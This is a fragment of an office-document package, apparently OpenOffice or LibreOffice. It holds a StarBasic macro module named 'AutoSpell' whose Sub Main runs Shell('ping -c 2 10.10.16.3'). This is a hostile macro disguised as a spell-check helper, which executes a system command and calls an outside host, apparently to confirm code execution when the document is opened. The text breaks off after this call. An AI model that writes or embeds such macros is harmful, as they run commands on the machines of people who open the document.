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AutoSp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AutoSpell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1:20:48.991745890</meta:creation-date>
    <dc:date>2023-08-27T11:23:53.266277773</dc:date>
    <meta:editing-duration>PT3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

<file path=Basic/Standard/AutoSpell.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="AutoSpell" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main

Shell("ping -c 2 10.10.16.3"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p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